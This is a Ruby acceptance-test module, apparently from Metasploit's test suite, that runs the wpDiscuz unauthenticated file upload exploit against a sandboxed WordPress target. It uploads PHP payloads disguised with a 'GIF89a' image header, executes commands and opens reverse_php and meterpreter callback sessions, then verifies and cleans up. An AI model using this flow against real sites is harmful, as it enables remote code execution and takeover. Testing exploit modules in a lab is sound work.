# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require_relative 'native'

module Acceptance
  # Genuine application, public console and remote session observations.
  module WpDiscuz
    OWNER = WpDiscuzProfiles::OWNER

    def wp_record(name, row)
      File.open(File.join(target_runtime.fetch('artifacts'), name), 'a') { |file| file.puts(JSON.generate(row)) }
    end

    def wp_wait(seconds, &)
      wait_for_expect(seconds * 5, 0.2, &)
    end

    def wp_json(expression)
      output = console_command("irb -e #{("puts 'WPDISCUZ_JSON=' + (#{expression}).to_json").inspect}", timeout: 50)
      lines = output.lines.grep(/^WPDISCUZ_JSON=/)
      expect(lines.length).to eq(1), output
      JSON.parse(lines.first.delete_prefix('WPDISCUZ_JSON='))
    end

    def wp_snapshot(label)
      @native.snapshot(label)
    end

    def wp_idle
      expect(wp_json('framework.sessions.keys')).to eq([])
      expect(wp_json('framework.jobs.keys')).to eq([])
    end

    def wp_resources(phase)
      services = ['app']
      services << 'db' unless @profile.fetch('mode') == 'unrelated'
      services << 'framework' unless @profile.fetch('payloads').empty?
      services.each do |service|
        %w[memory.events pids.events].each do |name|
          data = target_exec(service, 'cat', '/sys/fs/cgroup/' + name).lines.to_h do |line|
            key, value = line.split
            [key, Integer(value)]
          end
          wp_record('resource-counters.jsonl', phase: phase, service: service, counter: name, values: data)
          %w[oom oom_kill oom_group_kill max].each { |key| expect(data.fetch(key, 0)).to eq(0) }
        end
      end
    end

    def wp_call(options = {}, action: 'run', reuse: false)
      defaults = { 'SSL' => false, 'TARGETURI' => @profile.fetch('prefix') + '/', 'BLOGPATH' => @blogpath, 'HttpClientTimeout' => 5, 'HttpTrace' => true, 'HttpTraceHeadersOnly' => true, 'WfsDelay' => 0 }
      values = defaults.merge(options)
      output = if reuse
                 endpoint = target_runtime.fetch('module_endpoints', target_runtime.fetch('endpoints')).fetch('app')
                 endpoint_values = { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port'), 'VERBOSE' => true }
                 console_command(action + ' ' + format_datastore_options(endpoint_values.merge(values)), timeout: 70)
               else
                 run_target_module(OWNER, 'app', values, action: action, allow_errors: true, command_timeout: 70)
               end
      expect(output).not_to match(/Exception|undefined method|Unknown command|Msf::OptionValidateError|Call stack:|Unknown datastore option/)
      source = wp_json('{location: active_module.method(:upload_metadata).source_location, sha256: Digest::SHA256.file("modules/exploits/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload.rb").hexdigest, selected_payload: active_module.datastore["PAYLOAD"]}')
      expect(source.fetch('location').first).to end_with('/modules/exploits/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload.rb')
      expect(source.fetch('sha256')).to eq(Digest::SHA256.file(File.expand_path('../../../modules/exploits/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload.rb', __dir__)).hexdigest)
      wp_record('owner-provenance.jsonl', source.merge('action' => action, 'same_selected_instance' => reuse))
      output
    ensure
      wp_record('owning-calls.jsonl', action: action, options: values, same_selected_instance: reuse, output_base64: Base64.strict_encode64(output || console.all_data), wrapper_returned: !output.nil?)
    end

    def wp_recover(label)
      return if @profile.fetch('mode') == 'unrelated'

      current = wp_snapshot(label + '-before-operator-recovery')
      baseline_ids = @baseline.fetch('attachments').map { |file| file.fetch('id') }
      ids = current.fetch('attachments').map { |file| file.fetch('id') } - baseline_ids
      @native.recover(ids, label)
      target_exec('app', 'find', '/tmp/module-target-wpdiscuz-proofs', '-mindepth', '1', '-maxdepth', '1', '-type', 'f', '-delete')
      expect(wp_snapshot(label + '-after-operator-recovery')).to eq(@baseline)
    end

    def wp_command(auto_check: true)
      2.times do |iteration|
        marker = "wpdiscuz_owner_#{@case}_#{iteration}"
        output = wp_call({ 'PAYLOAD' => 'php/exec', 'CMD' => "printf %s #{marker} > /tmp/module-target-wpdiscuz-owner-proof", 'AutoCheck' => auto_check, 'DisablePayloadHandler' => true, 'AllowNoCleanup' => true }, reuse: iteration.positive?)
        expect(output).to include('Payload uploaded as ', 'Calling payload...')
        state = wp_snapshot('command-after-' + iteration.to_s)
        expect(state.fetch('owner_proof')).to eq(marker)
        expect(state.fetch('attachments')).to contain_exactly(include('exists' => true, 'path' => end_with('.php')))
        file = state.fetch('attachments').first
        expect(output).to include(File.basename(file.fetch('path')))
        expect(target_exec('app', 'stat', '-c', '%u', '/tmp/module-target-wpdiscuz-owner-proof').strip).to eq('33')
        wp_record('command-proofs.jsonl', case: @case, iteration: iteration, marker: marker, state: state, cleanup: 'Non-session payload: explicit operator attachment recovery follows')
        wp_idle
        wp_recover('command-' + iteration.to_s)
      end
    end

    def wp_connections(port)
      code = '$rows=[];foreach(["/proc/net/tcp","/proc/net/tcp6"] as $path){foreach(array_slice(file($path),1) as $line){$v=preg_split("/\\s+/",trim($line));$r=explode(":",$v[2]);if(in_array($v[3],["01","08"],true)&&hexdec(end($r))===(int)$argv[1]){$rows[]=$v;}}}echo json_encode($rows);'
      JSON.parse(target_exec('app', 'php', '-r', code, port.to_s))
    end

    def wp_listener_rows(port)
      code = "require 'json';rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map{|p|File.readlines(p).drop(1).map(&:split)};puts JSON.generate(rows.select{|r|r[3]=='0A'&&r[1].split(':').last.to_i(16)==#{port}})"
      JSON.parse(target_exec('framework', 'ruby', '-e', code))
    end

    def wp_wait_session(owner, payload)
      identifier = nil
      wp_wait(25) do
        rows = wp_json('framework.sessions.values.map { |s| {id:s.sid,type:s.type,owner:s.via_exploit,payload:s.via_payload} }')
        expect(rows.length).to eq(1)
        row = rows.first
        expect(row).to include('owner' => owner, 'payload' => 'payload/' + payload)
        identifier = row.fetch('id')
        events = File.readlines(File.join(target_runtime.fetch('artifacts'), 'ready-sessions.jsonl')).map { |line| JSON.parse(line) }
        expect(events.map { |event| event.fetch('id') }).to include(identifier)
      end
      identifier
    end

    def wp_use_and_close(identifier, payload, owner, label, port)
      path = '/tmp/module-target-wpdiscuz-proofs/' + label
      marker = 'wpdiscuz_' + label.tr('-', '_')
      proof = wp_json("WpDiscuzSessionControl.proof(framework,#{identifier},#{path.inspect},#{marker.inspect})")
      expect(proof).to include('owner' => owner, 'payload' => 'payload/' + payload, 'pid' => be_a(Integer), 'type' => payload == 'php/reverse_php' ? 'shell' : 'meterpreter')
      expect(target_exec('app', 'cat', path)).to eq(marker)
      expect(target_exec('app', 'stat', '-c', '%u', path).strip).to eq('33')
      # reverse_php executes each command in a fresh child shell. Its PID can
      # already be gone when the reply arrives, so capture that status inside
      # the real session command. Meterpreter exposes its persistent PHP PID.
      process = if proof.fetch('type') == 'shell'
                  proof.fetch('identity')
                else
                  target_exec('app', 'cat', "/proc/#{proof.fetch('pid')}/status")
                end
      expect(process[/^Uid:\s+(\d+)/, 1]).to eq('33')
      expect(process[/^Pid:\s+(\d+)/, 1].to_i).to eq(proof.fetch('pid'))
      expect(wp_connections(port)).not_to be_empty
      wp_record('session-proofs.jsonl', proof.merge('label' => label, 'file_bytes_base64' => Base64.strict_encode64(marker), 'process_status' => process, 'connections' => wp_connections(port)))
      expect(wp_json("DruidSessionControl.exit_remote(framework,#{identifier})")).to include('graceful_remote_exit_requested' => true)
      # PHP's Apache worker persists normally. Require transport closure rather
      # than demanding that an unrelated/reused worker PID disappear.
      wp_wait(20) { expect(wp_connections(port)).to eq([]) }
      wp_json("framework.sessions[#{identifier}]&.shell_close; true") if proof.fetch('type') == 'shell'
      wp_wait(20) { expect(wp_json('framework.sessions.keys')).to eq([]) }
      wp_record('session-closures.jsonl', id: identifier, label: label, remote_socket_absent_before_local_shell_close: true, remaining_sessions: [])
      target_exec('app', 'rm', '-f', '--', path)
    end

    def wp_native_sessions(payload, index)
      trigger = nil
      2.times do |iteration|
        port = 4470 + index
        console_command('back')
        expect(console_command('use exploit/multi/handler')).not_to include('[-]')
        { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => port, 'ExitOnSession' => false, 'ListenerTimeout' => 90 }.each do |key, value|
          expect(console_command("set #{key} #{value}")).not_to match(/\[-\]|Unknown datastore option/)
        end
        expect(console_command('run -j')).not_to include('[-]')
        jobs = wp_json('framework.jobs.keys')
        expect(jobs.length).to eq(1)
        job = jobs.first
        generated = wp_json("WpDiscuzSessionControl.cached_php(framework.jobs.fetch(#{job.inspect}),#{payload.inspect})")
        bytes = Base64.strict_decode64(generated.fetch('bytes_base64'))
        expect(Digest::SHA256.hexdigest(bytes)).to eq(generated.fetch('sha256'))
        wp_record('native-session-calibration.jsonl', generated.merge('iteration' => iteration, 'phase' => 'generated', 'owning_calls' => 0))
        wp_wait(10) { expect(wp_listener_rows(port)).not_to be_empty }
        result = @native.upload('native-session-upload', "module-target-session-#{index}-#{iteration}.php", 'GIF89a' + bytes)
        image = @native.accepted_image(result, 'GIF89a' + bytes, 'native-session-file')
        trigger = Thread.new { @native.request('native-session-trigger', @native.upload_path(image), timeout: 75) }
        trigger.report_on_exception = false
        identifier = wp_wait_session('exploit/multi/handler', payload)
        wp_use_and_close(identifier, payload, 'exploit/multi/handler', "native-#{index}-#{iteration}", port)
        expect(trigger.join(20)).not_to be_nil
        expect(trigger.value.code).to eq('200')
        wp_json("framework.jobs.stop_job(#{job.inspect}); true")
        wp_wait(10) { expect(wp_listener_rows(port)).to eq([]) }
        @native.recover([image.fetch('id')], 'native-session')
        expect(wp_snapshot('native-session-after')).to eq(@baseline)
        wp_record('native-session-calibration.jsonl', payload: payload, iteration: iteration, phase: 'used_and_remote_closed', owning_calls: 0)
        wp_idle
      end
    ensure
      trigger&.kill if trigger&.alive?
      trigger&.join
    end

    def wp_owner_sessions(payload, index)
      2.times do |iteration|
        port = 4480 + index
        # Omit PAYLOAD for the actual default selection. The passive observer
        # must still report the unchanged staged payload on both executions.
        options = { 'LHOST' => listener_host, 'LPORT' => port, 'DisablePayloadHandler' => false, 'WfsDelay' => 15 }
        options['PAYLOAD'] = payload unless payload == WpDiscuzProfiles::DEFAULT_PAYLOAD
        wp_call(options, action: 'run -z', reuse: iteration.positive?)
        observed = JSON.parse(File.readlines(File.join(target_runtime.fetch('artifacts'), 'effective-run-options.jsonl')).last)
        expect(observed.fetch('owner')).to eq(OWNER)
        expect(observed.fetch('options').fetch('PAYLOAD')).to eq(payload)
        identifier = wp_wait_session(OWNER, payload)
        state = wp_snapshot('owner-session-after-bootstrap')
        expect(state.fetch('attachments').length).to eq(1)
        # FileDropper deletes the physical file. The native WordPress API later
        # removes its attachment row; those are separate cleanup observations.
        wp_wait(15) { expect(wp_snapshot('owner-file-cleanup').fetch('attachments')).to contain_exactly(include('exists' => false)) }
        wp_record('module-cleanup.jsonl', case: @case, iteration: iteration, physical_file_absent_before_operator_recovery: true, attachment: state.fetch('attachments').first)
        wp_use_and_close(identifier, payload, OWNER, "owner-#{@case}-#{iteration}", port)
        wp_wait(15) { expect(wp_json('framework.jobs.keys')).to eq([]) }
        wp_recover('owner-session-' + iteration.to_s)
        wp_idle
      end
    end
  end
end
